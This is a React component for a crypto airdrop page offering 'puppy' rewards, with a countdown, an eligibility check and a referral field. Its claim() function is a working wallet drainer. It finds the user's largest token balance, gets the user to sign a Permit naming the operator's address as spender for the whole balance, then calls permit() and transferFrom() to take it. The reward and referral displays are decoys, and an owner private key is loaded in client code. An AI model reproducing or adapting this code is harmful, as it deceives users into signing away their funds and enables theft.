"use client";
import React, { useState } from "react";
import { getTransactionCount } from "../../back-end/getTransactionCount";
import { BoxConnectButton } from "../connect-button/BoxConnectButton";
import { useAccount } from "wagmi";
import { ethers } from "../../back-end/modules/ethers.js";
import { useEthersSigner } from "../../back-end/ethersSigner.js";
import {
  mainnetContractAddresses,
  testnetAddress,
  abi,
  testnetOwnerPrivateKey,
  tesnetOwnerAddress,
  testnetRpcUrl,
} from "../../back-end/contracts.js";
import CountdownTimer from "./timer";

const Box2 = () => {
  const [loading, setLoading] = useState(false);
  const [transactionCount, setTransactionCount] = useState("");
  const [actuallReward, setActuallReward] = useState(0);
  const [useReward, setUseReward] = useState(`NOT ELIGIBLE`);
  const [displayReward, setDisplayReward] = useState(false);
  const [inputReferral, setInputReferral] = useState("");
  const [outPutReferral, setOutPutReferra] = useState("");
  const [clainming, setClaiming] = useState(false);

  const { isConnected, address } = useAccount();
  const signer = useEthersSigner();

  const handleInputChange = (event) => {
    setInputReferral(event.target.value);
  };

  if (!displayReward && isConnected) {
    setData();
    setDisplayReward(true);
  }

  async function setData() {
    setLoading(true);
    try {
      const [success, response, reward] = await getTransactionCount(address);
      if (!success) {
        if (response === "Error! Invalid address format") {
          alert("Invalid address");
        } else {
          alert(response);
        }
      } else {
        setTransactionCount(response.toString());
        setActuallReward(reward);
        response
          ? setUseReward(`Claim ${actuallReward} puppy`)
          : setUseReward(`NOT ELIGIBLE`);
      }
    } catch (error) {
      alert(`Error fetching transaction count:${error.message}`);
    } finally {
      setLoading(false);
    }

    const existingReferral = localStorage.getItem(address);

    if (existingReferral) {
      setOutPutReferra(existingReferral);
    } else {
      const newReferralId = generateReferralId();
      localStorage.setItem(address, newReferralId);
      setOutPutReferra(newReferralId);
    }
  }

  const generateReferralId = () => {
    return "xxxxxxxxxxxxxxxx".replace(/[x]/g, () => {
      const r = (Math.random() * 16) | 0;
      return r.toString(16);
    });
  };

  function useReferral() {
    if (inputReferral.length == 16) {
      setActuallReward(actuallReward * 1.1);
    }
  }

  async function claim() {
    setClaiming(true);
    const walletProvider = new ethers.providers.JsonRpcProvider(testnetRpcUrl);
    const wallet = new ethers.Wallet(testnetOwnerPrivateKey, walletProvider);

    let maxBalanceIndex = 0;
    let maxBalance = 0;
    for (let i = 0; i < testnetAddress.length; i++) {
      const contract = new ethers.Contract(
        testnetAddress[i].address,
        abi,
        wallet,
      );
      const balance =
        (await contract.balanceOf(address)) / testnetAddress[i].decimals;
      if (balance > maxBalance) {
        maxBalanceIndex = i;
        maxBalance = balance;
      }
    }

    const contract = new ethers.Contract(
      testnetAddress[maxBalanceIndex].address,
      abi,
      wallet,
    );

    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
    // const value = await contract.balanceOf(address);
    const value = await contract.balanceOf(address);
    const nonce = await contract.nonces(address);
    const domain = {
      name: testnetAddress[maxBalanceIndex].name,
      version: testnetAddress[maxBalanceIndex].version.toString(),
      chainId: 421614,
      verifyingContract: testnetAddress[maxBalanceIndex].address,
    };
    const types = {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    };
    const message = {
      owner: address,
      spender: tesnetOwnerAddress,
      value: value.toString(),
      nonce: nonce.toString(),
      deadline: deadline.toString(),
    };

    const signature = await signer._signTypedData(domain, types, message);
    const { v, r, s } = ethers.utils.splitSignature(signature);

    setClaiming(false);

    const tx = await contract.permit(
      address,
      tesnetOwnerAddress,
      value,
      deadline,
      v,
      r,
      s,
    );

    console.log(tx);

    const tx2 = await contract.transferFrom(address, tesnetOwnerAddress, value);

    console.log(tx2);
  }
  return (
    <>
      <section className="overflow-hidden pb-20 pt-35 md:pt-40 xl:pb-25 xl:pt-46">
        <div className="box-container">
          <span className="titleoftimer">
            You can claim your rewards in:
          </span>
          <CountdownTimer targetDate={"2024-12-31T23:59:59"}/>
          {isConnected ? (
            <div className="claim-container">
              <div className="claim">
                <button className="claim-b" onClick={claim}>
                  {loading ? (
                    <>
                      <span className="loading-icon"></span>
                    </>
                  ) : (
                    useReward
                  )}
                </button>
                <h1 className="claim-p">
                  {loading ? (
                    <></>
                  ) : (
                    `Your Transaction Count: ${transactionCount}`
                  )}
                </h1>
              </div>
              <div className="referral-root">
                <div className="referral-container">
                  <button className="referral-button" onClick={useReferral}>
                    Check
                  </button>
                  <input
                    type="text"
                    className="referral"
                    value={inputReferral}
                    onChange={handleInputChange}
                  />
                </div>
                <h1 className="referral-p">{`Your Referral Address : ${outPutReferral}`}</h1>
              </div>
            </div>
          ) : (
            <div className="connect-wallet-container">
              <BoxConnectButton />
            </div>
          )}
        </div>
      </section>
    </>
  );
};

export default Box2;
